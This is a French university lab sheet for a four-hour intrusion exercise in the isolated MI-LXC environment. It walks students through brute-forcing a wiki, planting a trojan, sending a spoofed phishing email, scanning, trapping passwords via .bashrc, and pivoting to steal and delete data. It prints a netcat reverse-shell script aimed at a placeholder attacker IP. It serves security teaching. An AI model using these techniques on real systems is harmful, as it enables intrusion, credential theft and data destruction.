# TP 1 : Intrusion

_Sébastien Mériot_ ([@smeriot](https://twitter.com/smeriot))

_Cet énoncé est très très très fortement inspiré d'un TP créé par François Lesueur ([énoncé original](https://github.com/flesueur/srs/blob/master/tp1-intrusion.md))._

Durée: 4 heures

Préparation de l'environnement
==============================

Ces TPs se dérouleront en se basant sur l'environnement [MI-LXC](https://github.com/flesueur/mi-lxc).

Pour préparer votre environnement, vous allez avoir besoin de:
- [Virtual Box](https://www.virtualbox.org/wiki/Downloads)
- La VM MI-LXC pré-configurée disponible [ici](https://mi-lxc.citi-lab.fr/data/milxc-debian-amd64-1.3.1.ova)

Une fois le fichier `OVA` téléchargé, ouvrez `Virtual Box`, puis dans le menu `Fichier`, sélectionnez `Importer un appareil virtuel`. Choisissez le fichier `OVA` et patientez quelques minutes le temps de la création de la machine virtuelle.

Avant de lancer la VM, en fonction de votre configuration, il est peut-être nécessaire de diminuer la RAM allouée. Par défaut, la VM a 3GO : si vous avez 4Go sur votre machine physique, il vaut mieux diminuer à 2Go, voire 1.5Go pour la VM (la VM devrait fonctionner de manière correcte toujours).

L'infrastructure déployée simule plusieurs postes dont un SI d'entreprise (firewall, DMZ, intranet, authentification centralisée, serveur de fichiers, quelques postes de travail interne de l'entreprise _Target_), une machine d'attaquant et quelques autres servant à l'intégration de l'ensemble. Nous ne rentrerons pas dans le détail pour le moment de l'intégralité de l'architecture réseau.

> Pour les curieux, le code de MI-LXC, qui sert à générer cette VM automatiquement, est disponible avec une procédure d'installation documentée [ici](https://github.com/flesueur/mi-lxc)

Vous devez vous connecter à la VM en root/root. MI-LXC est déjà installé et l'infrastructure déployée, il faut avec un terminal aller dans le dossier `/root/mi-lxc`. Pour démarrer l'infrastructure, tapez `./mi-lxc.py start`. Une fois l'environnement démarré, vous pouvez commencer le TP !

> Dans la VM et sur les machines MI-LXC, vous pouvez installer des logiciels supplémentaires. Par défaut, vous avez mousepad pour éditer des fichiers de manière graphique. La VM peut être affichée en plein écran. Si cela ne fonctionne pas, il faut parfois changer la taille de fenêtre manuellement, en tirant dans l'angle inférieur droit, pour que VirtualBox détecte que le redimensionnement automatique est disponible. Il y a une case adéquate (taille d'écran automatique) dans le menu écran qui doit être cochée. Si rien ne marche, c'est parfois en redémarrant la VM que cela peut se déclencher. Mais il *faut* la VM en plein écran.


Cheat sheet
===========

Voici un petit résumé des commandes dont vous aurez besoin :

| Commande | Description | Utilisation |
| -------- | ----------- | ----------- |
| print    | Génère la cartographie du réseau | ./mi-lxc.py print |
| attach   | Permet d'avoir un shell sur une machine | ./mi-lxc.py attach root@target-commercial |
| display  | Lance un serveur X sur la machine cible | ./mi-lxc.py display target-commercial |

Rappel: Vous devez être dans le répertoire `mi-lxc` pour exécuter ces commandes.

> Si après avoir lancé la commande `display` votre souris reste bloquée, appuyez sur `CTRL+SHIFT` pour la libérer.

Déroulement général
===================

Votre objectif est de voler et détruire les informations internes de l'entreprise _Target_ (données comptables, base clients). Pour ce faire, vous travaillerez exclusivement sur la machine du hacker `isp-a-hacker`. Une première reconnaissance vous a amené à savoir que votre cible héberge un wiki sur `http://www.target.milxc`. Vous devrez réaliser les étapes suivantes :

* Récupération d'une adresse mail interne sur le wiki
* Altération du wiki en y intégrant un cheval de Troie prêt à être téléchargé par un interne
* Manipulation du commercial pour lui faire installer ce cheval de Troie (via un téléchargement interne donc plus crédible qu'une pièce jointe)
* Utilisation du cheval de Troie pour scanner le réseau interne
* Pivot vers la machine hébergeant les données ciblées
* Transfert puis suppression des données comptables et de la base clients
* Profit $$$

Le fil proposé ne couvre bien sûr pas l'ensemble des possibilités mais vise à montrer la diversité des moyens qu'un attaquant peut mettre en œuvre.

Préparation du cheval de Troie
==============================

Pour contrôler la machine du commercial, nous allons créer puis transmettre un cheval de Troie. Notre but est d'obtenir un shell sur la machine du commercial afin de l'utiliser comme pivot. Cependant, comme le firewall n'autorise pas les connexions vers l'intérieur de l'entreprise, nous allons plus spécifiquement envoyer un reverse-shell : c'est la machine du commercial qui initiera la connexion vers la machine du hacker.

Le code exemple suivant est disponible sur la machine du hacker (`/home/debian/tp/intrusion/trojan.sh`) :
```
#!/bin/bash
while [ 1 ]; do
	/bin/nc <IP Hacker> <Port Hacker> -q0 -e /bin/bash;
	sleep 1;
done
```

* Étudiez ce petit script, son fonctionnement, le programme nc (netcat). Pourquoi y a-t-il une boucle infinie ?
* Configurez et manipulez ce script en local pour ouvrir un reverse-shell avec vous-mêmes.
* Il existe plusieurs façons d'améliorer le shell obtenu (interactivité, gestion Ctrl-C, sortie d'erreur, autocomplétion, etc.), vous pouvez par exemple remplacer nc par socat comme expliqué [ici](https://artkond.com/2017/03/23/pivoting-guide/#beutifying-your-web-shell) ou appeler nc dans rlwrap.

> Une fois ce point compris, signalez-vous à un enseignant pour en discuter de vive voix

Altération du wiki
==================

Le wiki est accessible publiquement mais une authentification est nécessaire pour lire et écrire. Vous disposez dans le dossier `/home/debian/tp/intrusion` d'un script `dokuwiki.py` pour tenter de _bruteforcer_ l'authentification. Étudiez son fonctionnement puis tentez de découvrir un accès. Pour vous aider, des listes de mots de passes communs sont disponibles sur internet ([Wikipedia](https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords)), un dictionnaire au format adapté au script fourni est proposé [ici](passwords.txt). À partir de cet accès, créez une page crédible (mise à jour, installation d'un logiciel, etc.), intégrant le `.sh` que vous aurez préparé comme reverse-shell.


Corruption de la machine du commercial
======================================

Vous devez maintenant amener le commercial à exécuter votre cheval de Troie sur sa machine. Vous devez faire attention à envoyer un mail crédible, social-engineering, qui pousse le commercial à suivre les instructions. Notamment, pensez à faire du SMTP spoofing en changeant votre identité d'expéditeur. Dans un cas réel, il suffirait qu'un seul employé installe le cheval de Troie pour que l'attaque fonctionne

Appelez l'enseignant pour jouer le rôle du commercial, vérifiez le fonctionnement.

> Compte tenu de l'aspect distanciel, vous devrez afficher la machine target-commercial en tant que commercial : `./mi-lxc.py display commercial@target-commercial`, puis suivre les instructions de l'enseignant qui simulera le commercial.

Scan du réseau interne
======================

Il vous faut maintenant explorer le réseau pour trouver votre cible. Le programme `nmap` est un scanner réseau, installé sur la machine du hacker mais bien sûr pas du commercial. Il faut donc le transférer pour l'exécuter depuis la machine du commercial. Un serveur web est installé sur la machine du hacker et `nmap` est disponible dans le dossier `/usr/bin`. Le dossier `/var/www/html` du hacker est partagé par un serveur web, le programme en ligne de commande `wget` peut être utilisé côté commercial pour télécharger depuis ce dossier.

Utilisez maintenant nmap sur la machine du commercial pour explorer le réseau interne : `./nmap <adresse de réseau/masque>`. Dessinez un plan de réseau, les services ouverts, les logiciels utilisés, les sites accessibles, les contenus des index des sites web (accessibles avec wget ou curl). Soyez pertinent dans les adresses IP scannées, le scan est assez long.

> Pour connaître l'IP de la machine commercial : `/sbin/ifconfig`, utilisable en non-root pour la consultation des paramètres. Vous verrez que c'est un /16, la partie intéressante est au début de ce /16 : comme le scan est long, scannez plutôt les premiers /24.


Récupération d'un mot de passe valide
=====================================

Pour aller plus loin, vous aurez besoin d'un mot de passe valide sur le SI. Vous pouvez obtenir celui du commercial à partir de l'[analyse de son profil ClawsMail par exemple](https://github.com/AlessandroZ/LaZagne), en ajoutant un piège à son `.bashrc` lui demandant de retaper son mot de passe ou encore en intégrant la saisie lors du lancement du cheval de Troie.

Accès à la machine cible
========================

Pivotez vers la machine hébergeant les données ciblées. Pour faire du SSH, vous aurez besoin d'un shell [amélioré](https://artkond.com/2017/03/23/pivoting-guide/#beutifying-your-web-shell) ou d'utiliser [sshpass](https://srvfail.com/how-to-provide-ssh-password-inside-a-script-or-oneliner/) (disponible sur la machine du commercial). Vous pouvez ensuite utiliser la commande `find` avec les bons arguments pour trouver, sur cette machine cible, les fichiers sur lesquels vous pourriez avoir des droits en écriture.


Ouverture
=========

* [Retour de l'ANSSI sur l'incident de TV5Monde au SSTIC 2017](https://www.dailymotion.com/video/x5qs6c0)
* [D'un XLSB à un SI entièrement chiffré en 3 jours](https://thedfirreport.com/2021/08/01/bazarcall-to-conti-ransomware-via-trickbot-and-cobalt-strike/)

Disclaimer
==========

![Bad guy](media/bad.jpg)

_Attention, lui, il l'a fait pour de vrai..._
